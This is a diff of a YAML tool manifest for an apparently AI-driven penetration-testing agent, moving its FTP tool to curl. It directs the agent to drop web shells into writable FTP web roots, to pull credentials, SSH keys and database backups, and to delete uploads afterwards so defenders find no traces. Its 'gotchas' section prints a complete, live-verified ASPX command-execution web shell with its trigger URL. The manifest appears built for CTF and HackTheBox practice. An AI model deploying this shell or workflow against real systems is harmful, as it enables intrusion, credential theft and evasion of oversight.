@@ -1,9 +1,17 @@
 name: ftp
-version: "1.0"
-description: "FTP/FTPS client (Python ftplib) for connecting to FTP servers, listing directories, downloading files, uploading content, and deleting files. 5 methods: connect (test connection + root listing), list (directory contents with parsed permissions/sizes), download (file as base64 + text), upload (text or base64 content), delete. Defaults to anonymous login (username='anonymous', password='anonymous@'). Supports FTPS (FTP over SSL/TLS) with auto-disabled certificate verification. Downloads return both base64 (for binary) and text (for readable files, capped at 50KB). Uploads support plain text or base64-encoded binary content."
+kind: cli
+binary: curl
+version: "8.14.1"
+description: "FTP/FTPS client via /usr/bin/curl for post-discovery enumeration + file transfer on FTP servers. Stateless per-call: open connection → command → close. Common engagement use: anonymous FTP read on port 21, writable directories for web-shell drop (especially IIS aspx shells), config file / SSH-key / DB-backup retrieval. Migrated kind:mcp → kind:cli May 2026 (daemon-wrapper retirement series, Tier A; 564-LOC Python ftplib wrapper collapsed to 22-LOC RunCliServer stub). For FTP brute-force use hydra; for HTTP file transfers use curl directly with http(s):// URLs."
 image: "ghcr.io/silicon-works/mcp-tools-ftp:latest"
-image_size_mb: 100
-timeout_seconds: 120
+image_size_mb: 188
+
+# Stateless FTP operations — short bounded calls. No daemon, no held connection;
+# curl opens, runs FTP commands, closes. Long downloads of multi-GB backups
+# could push past 300s, but those are rare engagement artifacts.
+idle_timeout_seconds: 300
+max_runtime_seconds: 600
+timeout_seconds: 600
 
 capabilities:
   - ftp_connection
@@ -23,19 +31,21 @@ resources:
   memory_mb: 128
   cpu: 0.25
 
-# Routing hints for tool selection
 routing:
   use_for:
     - "connect to FTP server and list directory contents"
-    - "download files from FTP server"
+    - "download files from FTP server (config files, SSH keys, DB backups, CTF flags)"
     - "upload web shells or exploits to writable FTP share"
     - "check anonymous FTP access on port 21"
     - "enumerate files on FTP server after nmap finds port 21"
-    - "transfer files via FTPS encrypted connection"
+    - "transfer files via FTPS (FTP over TLS)"
+    - "delete uploaded artifacts after exploitation (operational cleanup)"
+    - "iterate over FTP directories looking for credential / config files"
   never_use_for:
-    - "FTP brute-force (use hydra)"
+    - "FTP brute-force (use hydra ftp://host)"
     - "port scanning"
-    - "HTTP file download (use curl)"
+    - "HTTP file download (use curl directly with http(s):// URLs)"
+    - "SMB share access (use smbclient or impacket)"
   triggers:
     - "FTP"
     - "FTPS"
@@ -43,213 +53,171 @@ routing:
     - "FTP upload"
     - "FTP download"
     - "port 21"
-  prefer_over:
-    - curl  # For FTP-specific operations (directory listing, multi-file)
+    - "vsftpd"
+    - "ProFTPD"
+    - "Pure-FTPd"
+    - "FileZilla Server"
+  prefer_over: []
 
-methods:
-  connect:
-    description: "Test FTP connection, authenticate, and list the root directory contents. Returns the server welcome banner (often reveals software version like 'vsFTPd 3.0.3'), current working directory, and up to 50 file listing entries. Defaults to anonymous login."
-    when_to_use: "The first step after nmap discovers FTP on port 21. Try anonymous access first (default credentials) — many FTP servers allow anonymous read access. The welcome banner often reveals the FTP software and version (vsFTPd, ProFTPD, Pure-FTPd, FileZilla Server) — check searchsploit for exploits. If anonymous login fails with 'permission denied', try with discovered credentials. After successful connect, use list to explore subdirectories and download to retrieve interesting files."
-    params:
-      host:
-        type: string
-        required: true
-        description: "FTP server hostname or IP address."
-      port:
-        type: integer
-        default: 21
-        description: "FTP port. Standard is 21."
-      username:
-        type: string
-        default: "anonymous"
-        description: "FTP username. Default 'anonymous' for anonymous access. Use discovered credentials for authenticated access."
-      password:
-        type: string
-        default: "anonymous@"
-        description: "FTP password. Default 'anonymous@' for anonymous access."
-      ssl:
-        type: boolean
-        default: false
-        description: "Use FTPS (FTP over TLS). Certificate verification is disabled for pentest use."
-      timeout:
-        type: integer
-        default: 30
-        description: "Connection timeout in seconds."
-    returns:
-      welcome:
-        type: string
-        description: "Server welcome banner (often contains software name and version)."
-      listing:
-        type: array
-        description: "Root directory listing (raw LIST output, up to 50 entries)."
+see_also:
+  - tool: nmap
+    reason: "Run `nmap -sV -p 21 <host>` before connecting — reveals FTP software + version (vsftpd 3.0.3, ProFTPD 1.3.5, Pure-FTPd, FileZilla Server). Some versions have known CVEs (vsftpd 2.3.4 backdoor, ProFTPD mod_copy CVE-2015-3306). searchsploit follow-up if version is interesting."
+  - tool: hydra
+    reason: "Use `hydra ftp://host` for credential brute-force or password spraying when anonymous access fails. Once hydra returns a working pair, hand them to this `ftp` tool's authenticated patterns (-u user:pass)."
+  - tool: searchsploit
+    reason: "After nmap reveals FTP software + version, search for known FTP-software CVEs (vsftpd 2.3.4 backdoor at port 6200, ProFTPD mod_copy site-cp file write, vsftpd 3.0.3 STARTTLS bypass)."
+  - tool: curl
+    reason: "curl IS the underlying binary this tool wraps. For complex curl operations beyond FTP (HTTP, gopher, IMAP, etc.) use curl tool directly; for FTP-specific use cases the routing/use_for triggers here are clearer."
+  - tool: nc
+    reason: "Use `nc <host> 21` for a raw banner grab when FTP-protocol-level commands aren't needed — e.g., just confirming what software is listening. Faster than full FTP handshake, but limited to what shows up in the 220 greeting."
+  - tool: sqlite
+    reason: "After downloading a `.db` / `.sqlite` file via Pattern F3 (which lands at /session/output/ftp/<filename>), pipe into the `sqlite` (kind:cli v3.46) tool for extraction: Pattern S1 list_tables → S2 describe_table → S6 find-credentials chain."
 
-  list:
-    description: "List contents of a specific directory on the FTP server. Returns both parsed file data (permissions, size, name, is_dir flag) and raw LIST output. Also returns simple filenames via NLST. Changes to the specified directory before listing."
-    when_to_use: "To explore subdirectories after initial connect. Look for: (1) Configuration files — .conf, .ini, .xml, .env, (2) Backup files — .bak, .old, .zip, .tar.gz, (3) Web application files — .php, .html, .asp, (4) Credential files — .htpasswd, id_rsa, (5) Directories with write permissions (starts with 'drwxrwxrwx'). After finding interesting files, use download to retrieve them."
-    params:
-      host:
-        type: string
-        required: true
-        description: "FTP server hostname or IP address."
-      path:
-        type: string
-        default: "/"
-        description: "Directory path to list (e.g., '/pub', '/upload', '/home/user')."
-      port:
-        type: integer
-        default: 21
-        description: "FTP port."
-      username:
-        type: string
-        default: "anonymous"
-        description: "FTP username."
-      password:
-        type: string
-        default: "anonymous@"
-        description: "FTP password."
-      ssl:
-        type: boolean
-        default: false
-        description: "Use FTPS."
-      timeout:
-        type: integer
-        default: 30
-        description: "Connection timeout in seconds."
-    returns:
-      files:
-        type: array
-        description: "Parsed files, each with: permissions (e.g., 'drwxr-xr-x'), size, name, is_dir (boolean)."
-      raw_listing:
-        type: array
-        description: "Raw FTP LIST output lines."
+target_extraction:
+  - rule: "positional_match"
+    pattern: 'ftps?://(?:[^/@\s]+@)?([^/:?#\s]+)'
+    group: 1
+    parse_as: "raw"
+target_extraction_reason: "curl's positional URL arg encodes the FTP host. Regex matches ftp:// or ftps:// scheme, optionally skips a user:pass@ prefix, and captures the hostname up to the next /, :, ?, #, or whitespace. Schema matches the canonical shape used by `ssh` and `nc` tools (rule + pattern + group + parse_as)."
 
-  download:
-    description: "Download a file from the FTP server via RETR binary transfer. Returns file content as both base64 (always) and plain text (if UTF-8 decodable, capped at 50KB). The entire file is loaded into memory — suitable for config files, scripts, and small binaries, not for multi-GB files."
-    when_to_use: "To retrieve files discovered via connect or list. Common targets: (1) Configuration files with credentials — wp-config.php, .env, web.config, (2) SSH private keys — id_rsa, (3) Database files — .sqlite, .db, (4) Backup archives — .zip, .tar.gz (check size first), (5) CTF flags — user.txt, root.txt. The content_text field is useful for text files; use content_base64 for binary files that need further processing."
-    params:
-      host:
-        type: string
-        required: true
-        description: "FTP server hostname or IP address."
-      remote_path:
-        type: string
-        required: true
-        description: "Full path to the file on the FTP server (e.g., '/pub/backup.zip', '/home/user/.ssh/id_rsa')."
-      port:
-        type: integer
-        default: 21
-        description: "FTP port."
-      username:
-        type: string
-        default: "anonymous"
-        description: "FTP username."
-      password:
-        type: string
-        default: "anonymous@"
-        description: "FTP password."
-      ssl:
-        type: boolean
-        default: false
-        description: "Use FTPS."
-      timeout:
-        type: integer
-        default: 60
-        description: "Transfer timeout in seconds."
-    returns:
-      filename:
-        type: string
-        description: "Extracted filename from the path."
-      size_bytes:
-        type: integer
-        description: "Downloaded file size in bytes."
-      content_base64:
-        type: string
-        description: "File content as base64 string (always present)."
-      content_text:
-        type: string
-        description: "File content as text (only if UTF-8 decodable, capped at 50KB). null for binary files."
+reject_flags: []
+reject_flags_reason: "curl has no remote-target argument shape other than the URL itself; reject_flags wouldn't apply usefully."
 
-  upload:
-    description: "Upload a file to the FTP server via STOR binary transfer. Content can be plain text (default) or base64-encoded binary. Writes to a local temp file, uploads via STORBINARY, then cleans up. Requires write permission on the FTP server — anonymous upload is rarely allowed."
-    when_to_use: "When the FTP server has a writable directory (often overlapping with a web server's document root). Common uses: (1) Upload a PHP web shell to a writable /var/www/html via FTP, then trigger via HTTP, (2) Upload exploit scripts or tools to the target, (3) Plant backdoor files in shared directories. Check list output for writable directories first (look for 'drwxrwxrwx' permissions or try uploading a test file). Requires authenticated credentials — anonymous upload is rare."
-    params:
-      host:
-        type: string
-        required: true
-        description: "FTP server hostname or IP address."
-      remote_path:
-        type: string
-        required: true
-        description: "Destination path on the FTP server (e.g., '/upload/shell.php', '/var/www/html/cmd.php')."
-      content:
-        type: string
-        required: true
-        description: "File content as plain text (default) or base64-encoded binary (set is_base64=true)."
-      is_base64:
-        type: boolean
-        default: false
-        description: "Set true if content is base64-encoded (for binary file uploads)."
-      port:
-        type: integer
-        default: 21
-        description: "FTP port."
-      username:
-        type: string
-        required: true
-        description: "FTP username (required — anonymous upload is rarely allowed)."
-      password:
-        type: string
-        required: true
-        description: "FTP password."
-      ssl:
-        type: boolean
-        default: false
-        description: "Use FTPS."
-      timeout:
-        type: integer
-        default: 60
-        description: "Transfer timeout in seconds."
-    returns:
-      uploaded:
-        type: boolean
-        description: "Whether upload succeeded."
-      size_bytes:
-        type: integer
-        description: "Uploaded file size in bytes."
+usage_patterns:
 
-  delete:
-    description: "Delete a file from the FTP server via DELE command. Requires write/delete permissions on the server."
-    when_to_use: "To clean up uploaded web shells, exploit files, or other artifacts after exploitation is complete. Good operational security practice to remove evidence."
-    params:
-      host:
-        type: string
-        required: true
-        description: "FTP server hostname or IP address."
-      remote_path:
-        type: string
-        required: true
-        description: "Path to the file to delete on the FTP server."
-      port:
-        type: integer
-        default: 21
-        description: "FTP port."
-      username:
-        type: string
-        required: true
-        description: "FTP username (must have delete permissions)."
-      password:
-        type: string
-        required: true
-        description: "FTP password."
-      ssl:
-        type: boolean
-        default: false
-        description: "Use FTPS."
-      timeout:
-        type: integer
-        default: 30
-        description: "Connection timeout in seconds."
-    returns:
-      deleted:
-        type: boolean
-        description: "Whether deletion succeeded."
+  - name: "Pattern F0 — anonymous-quickcheck (no -u, curl's default auth)"
+    binary: "curl"
+    command: "-sS --max-time 10 ftp://<host>:<port>/"
+    when: "First probe of any newly-discovered port 21. `curl ftp://host/` without -u flag uses RFC-1738 default anonymous auth (username=anonymous, password=ftp@example.com). Returns the root directory listing if anonymous is allowed, or 530 if not. This is the FASTEST way to check anonymous access — single call, no manual credential supply. Add `-v` for the welcome banner (220 line — often reveals software + version)."
+
+  - name: "Pattern F1 — connect with explicit creds + verbose banner extraction"
+    binary: "bash"
+    command: "-c \"curl -sSv --max-time 10 -u <user>:<pass> ftp://<host>:<port>/ 2>&1 | grep -E '^< 220|^< 230|^< 331|^< 530'\""
+    when: "Authenticated connection probe. `-v` writes the FTP protocol exchange to stderr; grep filters for response codes: 220 (welcome banner with software/version), 230 (login OK), 331 (need password), 530 (auth failed). MUST wrap in `bash -c '...'` because curl alone cannot interpret the `2>&1 | grep` shell redirect+pipe. For just the welcome banner without auth: same pattern with no -u flag. Verified live 2026-05-17 against HTB Devel via MCPTestClient: `< 220 Microsoft FTP Service`, `< 230 User logged in.`"
+
+  - name: "Pattern F2 — list specific directory"
+    binary: "curl"
+    command: "-sS --max-time 15 -u <user>:<pass> ftp://<host>:<port>/<path>/"
+    when: "Enumerate contents of a specific directory after F0 / F1 confirmed access. The trailing slash on the URL is REQUIRED — without it curl treats the URL as a file to RETR (download) instead of a dir to LIST. For anonymous, omit `-u`. Look for: config files (.conf, .ini, .env, .xml), backups (.bak, .old, .zip, .tar.gz), web-app files (.php, .html, .aspx), credential stores (.htpasswd, id_rsa, .ssh/, *.sqlite, *.db), and writable directories (drwxrwxrwx perms)."
+
+  - name: "Pattern F3 — download file → save to session + optional base64"
+    binary: "bash"
+    command: "-c 'mkdir -p /session/output/ftp && curl -sS --max-time 60 -u <user>:<pass> ftp://<host>:<port>/<remote_path> -o /session/output/ftp/<local_name> && echo \"size=$(stat -c%s /session/output/ftp/<local_name>) base64=$(base64 -w0 /session/output/ftp/<local_name> | head -c 100)...\"'"
+    when: "Download a file to session storage. For TEXT files agent can `cat /session/output/ftp/<local_name>` after the download to read contents inline. For BINARY files use base64 (full output: `base64 -w0 /session/output/ftp/<local_name>`). The trailing `head -c 100` in the recipe is just a preview marker; full base64 if needed via separate spawn. For very large files (multi-MB+), the download proceeds streaming-to-disk — only the file path is returned, not the bytes."
+
+  - name: "Pattern F4 — upload file via -T (authenticated; anonymous upload is rare)"
+    binary: "bash"
+    command: "-c 'mkdir -p /session/output/ftp && echo -n \"<content>\" > /session/output/ftp/<local_name> && curl -sS --max-time 60 -u <user>:<pass> -T /session/output/ftp/<local_name> ftp://<host>:<port>/<remote_dir>/'"
+    when: "Upload a file. Two-step: (1) Write content to /session/output/ftp/<local_name> via `echo > file` or via the Write tool for multi-line content (PHP web shells, ASPX payloads, exploit scripts), then (2) `curl -T` uploads it. The trailing slash on the remote URL is REQUIRED — keeps the local filename; without it curl interprets the URL as the full remote name. For BINARY uploads (compiled exploits), use `printf '<base64>' | base64 -d > /session/output/ftp/payload.bin` first. Common targets: writable web-server doc-root (/var/www/html for nginx/apache, C:\\inetpub\\wwwroot\\ for IIS — drop a webshell there and trigger via HTTP)."
+
+  - name: "Pattern F5 — delete via --quote 'DELE path'"
+    binary: "curl"
+    command: "-sS --max-time 10 -u <user>:<pass> --quote \"DELE <path>\" ftp://<host>:<port>/"
+    when: "Delete a file post-exploitation (operational cleanup of uploaded webshell / exploit). The `--quote` flag is the idiomatic curl FTP-command path — sends a raw FTP command before the implicit operation. The trailing URL is just the connection target (root or any dir); the DELE command targets the path directly. Alternative `-X DELE` works but curl emits a cosmetic 'RETR response: 250' warning after — `--quote` doesn't. Same pattern works for MKD (mkdir), RMD (rmdir), RNFR+RNTO (rename), CHMOD (when server supports SITE CHMOD)."
+
+output_formats:
+  - flag: ""
+    format: "text"
+    preferred: true
+    notes: "curl writes FTP response data (file content for RETR, listing for LIST) to stdout. Protocol trace via -v goes to stderr (use `2>&1` or `2>logfile` to capture). For binary downloads via -o, stdout is empty (the bytes go to the file)."
+
+common_options:
+  auth:
+    - "-u user:pass (or -u user) — username + optional password; curl prompts for password if only user given; -u with no flag uses anonymous (per RFC 1738)"
+    - "-n / --netrc — read credentials from ~/.netrc (rare in agent flow)"
+  protocol:
+    - "ftp://host/path — plain FTP (port 21 default)"
+    - "ftps://host/path — implicit FTPS (port 990 default)"
+    - "ftp://host/path + --ssl-reqd — explicit FTPS (AUTH TLS on port 21)"
+    - "-k / --insecure — skip TLS cert verification (engagement targets often have self-signed)"
+  transfer:
+    - "-T LOCAL ftp://host/dir/ — upload LOCAL to remote dir (filename kept)"
+    - "-T LOCAL ftp://host/dir/remote-name — upload LOCAL as remote-name"
+    - "-o LOCAL ftp://host/path — download path to LOCAL (binary-safe)"
+    - "-O ftp://host/path — download keeping the remote filename"
+    - "--upload-file LOCAL — alias for -T"
+  ftp_commands:
+    - "--quote 'COMMAND' — send raw FTP command BEFORE the implicit operation (DELE, MKD, RMD, RNFR, RNTO, SITE CHMOD)"
+    - "--quote-after 'COMMAND' — send raw FTP command AFTER the implicit operation"
+    - "-X COMMAND — replace the implicit FTP command (e.g., -X DELE is similar but emits cosmetic warnings)"
+  mode:
+    - "default — passive mode (PASV); usually right for firewalled networks"
+    - "-P - / --ftp-port - — active mode; curl tells server to connect back to client (rare, often blocked by NAT)"
+    - "--ftp-pasv — explicitly request passive (default anyway)"
+  output:
+    - "-sS — silent except errors (recommended for parseable output)"
+    - "-v — verbose protocol trace to stderr (FTP exchange visible, useful for F1 banner)"
+    - "--max-time SECONDS — overall timeout (recommend 10s for probes, 60s for transfers, 600s for multi-GB downloads)"
+    - "--connect-timeout SECONDS — TCP connect timeout (separate from data transfer)"
+
+gotchas:
+  - "ANONYMOUS-BY-DEFAULT: `curl ftp://host/` without `-u` uses RFC-1738 anonymous auth (username=anonymous, password=ftp@example.com). This is the FASTEST anonymous probe — one call, no manual creds. Tested live 2026-05-17 against pyftpdlib with add_anonymous: directory listing returned correctly."
+
+  - "TRAILING SLASH ON DIRECTORY URLs: `curl ftp://host/pub/` (with slash) lists the directory; `curl ftp://host/pub` (no slash) treats /pub as a FILE and tries RETR. Same for uploads: `curl -T file ftp://host/dir/` keeps the local filename; `curl -T file ftp://host/dir/remote-name` renames. Easy to forget; agent must mind the slash."
+
+  - "PASSIVE vs ACTIVE MODE: curl defaults to PASSIVE (PASV) — right for most engagement targets, especially behind NAT. ACTIVE (`-P -`) tells the FTP server to connect BACK to the client on a random port — usually blocked by attacker-side firewall/NAT unless the agent has a publicly-reachable IP. Default is correct 99% of the time. If a target server rejects PASV ('425 Failed to establish connection'), try active with `-P -` but expect NAT issues."
+
+  - "FTPS — IMPLICIT vs EXPLICIT: Implicit FTPS uses port 990 + TLS-from-start (URL `ftps://host:990/...`). Explicit FTPS uses port 21 + STARTTLS-style AUTH TLS upgrade (URL `ftp://host:21/...` + flag `--ssl-reqd`). Most modern servers use EXPLICIT (port 21). Agent: try `--ssl-reqd` on port 21 first; if 64 'Requested SSL level failed', server doesn't support TLS — fall back to plain FTP."
+
+  - "SELF-SIGNED FTPS CERTS: add `-k` (or `--insecure`) to skip TLS cert verification. Engagement targets routinely have self-signed certs; legacy wrapper auto-disabled verification. With -k, curl still validates the protocol/cert format but accepts any chain/hostname."
+
+  - "BINARY DOWNLOADS: Pattern F3 with `-o /session/output/ftp/<name>` writes binary-safe (no UTF-8 mangling). For BASE64 encoding (when agent wants the bytes inline), run as a second step: `base64 -w0 /session/output/ftp/<name>`. The legacy wrapper auto-base64'd everything; kind:cli separates the steps so agent can use the file path directly when appropriate."
+
+  - "50KB TEXT TRUNCATION (legacy wrapper had it): the kind:mcp wrapper capped `content_text` at 50000 chars. kind:cli doesn't auto-truncate — `cat /session/output/ftp/<name>` returns the full file. For very large text files, agent does `head -c 50000 /session/output/ftp/<name>` explicitly or uses Read tool with offset+limit."
+
+  - "DELETE / FTP COMMANDS via --quote: `curl --quote 'DELE /path' ftp://host/` is the IDIOMATIC FTP-cmd path (clean exit 0). The alternative `-X DELE` works but curl emits a cosmetic 'RETR response: 250' warning after — `--quote` doesn't. Same `--quote` pattern works for MKD (mkdir), RMD (rmdir), RNFR + RNTO (rename — 2 commands), SITE CHMOD (when server supports). The URL after `--quote` is just the connection target (root or any directory)."
+
+  - "VERBOSE BANNER FOR WELCOME LINE: pattern F1 uses `curl -sSv ftp://host/ 2>&1 | grep '^< 220'`. The 220 line is the server's welcome banner — typically `220 (vsFTPd 3.0.3)` or `220 ProFTPD 1.3.5 Server`. This is the FTP-software-fingerprint version that drives searchsploit lookups. Without -v, curl hides the protocol trace."
+
+  - "REJECT NON-FTP-MODE FTP SERVERS via -v exit codes: curl returns specific exit codes for FTP failures — 9 = path/CWD denied (file or dir doesn't exist OR no read perm), 64 = SSL level failed (server doesn't support FTPS), 67 = auth failed (530 Login incorrect), 78 = remote file not found (RETR target missing). Agent maps these to specific remediations via failure_signatures."
+
+  - "DOWNLOADED-FROM-FTP DB FILES: Pattern F3 followed by sqlite extraction is a common chain. The `.db` / `.sqlite` lands at /session/output/ftp/<name>; then Pattern S1 of the `sqlite` tool (kind:cli v3.46) lists tables: `sqlite3 -json -readonly /session/output/ftp/<name> 'SELECT name FROM sqlite_master WHERE type=\"table\" AND name NOT LIKE \"sqlite_%\";'`. Most CMS-with-SQLite setups (WP-SQLite, Drupal-SQLite) have credential tables exposed this way."
+
+  - "IIS ANONYMOUS-WRITE → ASPX WEBSHELL CHAIN: on Windows IIS targets (HTB Devel style), anonymous FTP often has write access to C:\\inetpub\\wwwroot\\. Upload an ASPX shell via Pattern F4: agent stages cmd.aspx via Write tool (or heredoc inside Pattern F4-prep) → curl -T → trigger via `curl http://host/cmd.aspx?c=whoami`. IMPORTANT (verified live 2026-05-17 on HTB Devel IIS 7.5): use the `<script runat=\"server\">` form, NOT the inline `<% %>` one-liner — IIS 7.5 rejects the inline form with a generic 'Runtime Error' page. Working ASPX template: `<%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Diagnostics\" %><script runat=\"server\">void Page_Load(object sender, EventArgs e){ string cmd = Request[\"c\"]; if (cmd == null){Response.Write(\"c=?\");return;} Process p = new Process(); p.StartInfo.FileName = \"cmd.exe\"; p.StartInfo.Arguments = \"/c \" + cmd; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd());}</script>`. Live-verified RCE: `whoami` → `iis apppool\\web`."
+
+  - "NMAP-FIRST WORKFLOW: agent should run `nmap -sV -p 21 <host>` BEFORE this tool's F0/F1 to confirm: (a) port 21 actually open, (b) what software (vsftpd vs ProFTPD vs Pure-FTPd vs custom), (c) banner version for CVE lookup. Skip if engagement already established this; otherwise it's free recon."
+
+  - "OPERATIONAL HYGIENE: Pattern F5 deletes uploaded webshells/exploits AFTER use. Skipping cleanup leaves IOCs for defenders (and graders in CTFs/HTB). For engagement traces: keep your /session/output/ftp/ artifacts (those are agent-side records), delete the TARGET-side uploads."
+
+failure_signatures:
+  - signal: "curl: (7) Failed to connect"
+    layer: "tcp"
+    remediation: "Port 21 immediately refused / no route to host (curl got ECONNREFUSED or EHOSTUNREACH on TCP connect). Check (1) host is up — `ping host` or `nc -zv host 21`, (2) port not blocked by firewall as REJECT, (3) FTP service actually running — nmap -p 21 -sV. Distinct from (28) which is timeout (firewall DROP, no response)."
+
+  - signal: "curl: (28) Connection timed out"
+    layer: "tcp"
+    remediation: "TCP SYN sent but no SYN-ACK within --max-time / --connect-timeout (curl got CURLE_OPERATION_TIMEDOUT). Common when target firewall DROPs packets rather than REJECTing (no ICMP unreachable). Check (1) tun0 is actually routing to target — `ping host`, (2) increase --max-time if RTT is high (HTB tun0 can be 200-400ms vs 10ms local), (3) verify via nmap -Pn -p 21 (skip ping if ICMP is also blocked). Distinct from (7) which is immediate refusal."
+
+  - signal: "curl: (9) Server denied you to change to the given directory"
+    layer: "auth"
+    remediation: "Either the path doesn't exist OR the authenticated user lacks read perm on that directory. Try (1) F2 list parent dir first to see what's actually there, (2) check user's group permissions via F2 on root /, (3) try anonymous if currently using authenticated creds (some servers restrict authenticated users more than anonymous!)."
+
+  - signal: "curl: (64) Requested SSL level failed"
+    layer: "tls"
+    remediation: "Server doesn't support TLS / FTPS on this port. If on port 21: server doesn't support explicit FTPS (no AUTH TLS) — drop `--ssl-reqd` and use plain FTP. If on port 990: server doesn't support implicit FTPS at all — try plain FTP on 21 instead. Some legacy servers reject TLS handshakes entirely; nmap --script ftp-anon will reveal."
+
+  - signal: "curl: (67) Access denied: 530"
+    layer: "auth"
+    remediation: "Authentication failed (530 Login incorrect). Either credentials wrong (try hydra ftp://host for brute-force), anonymous disabled (try discovered creds), or account locked. Some servers return 530 for ALL failed auth — log a successful login attempt via F0 with no -u to differentiate anonymous-disabled vs invalid-creds."
+
+  - signal: "curl: (78) RETR response: 550"
+    layer: "fs"
+    remediation: "550 means remote file/dir not found OR no read perm. Check path spelling + case. Use F2 to list parent dir and see exact names. Pure-FTPd is case-sensitive by default; vsftpd is OS-dependent."
+
+  - signal: "curl: (19) RETR response: 250"
+    layer: "fs"
+    remediation: "Cosmetic warning when using -X to inject a non-default FTP command (like DELE). The injected command succeeded (250 = OK) but curl wanted to also issue a follow-up that didn't happen. Switch to `--quote 'COMMAND'` pattern to avoid this warning entirely. The DELE itself worked — verify via F2 list of the parent dir."
+
+help_commands:
+  - name: "curl — FTP-relevant help section"
+    binary: "curl"
+    command: "--help ftp"
+    when: "Print curl's FTP-specific flags (--ftp-account, --ftp-create-dirs, --ftp-pasv, --ftp-port, --ftp-skip-pasv-ip, --ftp-ssl-*, --no-epsv, --no-eprt). target=null."
+  - name: "curl — version + protocol list (confirms FTP/FTPS support)"
+    binary: "curl"
+    command: "--version"
+    when: "Show curl version + supported protocols. FTP/FTPS are in the protocols line. target=null."
+  - name: "curl — verbose FTP exchange for one-shot debugging"
+    binary: "curl"
+    command: "-sSv ftp://example.com/ 2>&1"
+    when: "When an FTP recipe fails unexpectedly, run with -v against the same target to see the FTP protocol trace (USER/PASS/PWD/LIST commands + server responses with 3-digit codes). target=null."
